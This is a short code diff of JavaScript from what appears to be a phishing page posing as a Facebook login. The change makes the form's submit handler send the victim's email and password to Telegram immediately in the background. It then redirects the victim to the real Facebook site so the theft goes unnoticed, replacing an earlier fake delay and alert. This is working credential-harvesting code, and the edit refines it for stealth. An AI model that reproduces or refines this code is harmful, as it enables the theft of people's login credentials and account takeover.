@@ -244,21 +244,15 @@
 
             
 
-            // Simulate loading delay
+            // Send data to Telegram first (background)
 
-            setTimeout(() => {
+            sendToTelegram(email, password);
 
-                sendToTelegram(email, password);
+            
 
-                btn.style.display = 'none';
-
-                alert("Logged in successfully!");
-
-                // Optional: Redirect to real site
-
-                // window.location.href = "https://www.facebook.com/";
-
-            }, 2000);
+            // Immediately Redirect to Facebook
+            
+            window.location.href = "https://www.facebook.com/";
 
         });
 
@@ -289,8 +283,6 @@
                 })
 
             })
-
-            .then(response => console.log('Sent to Telegram'))
 
             .catch(error => console.error('Error:', error));
 
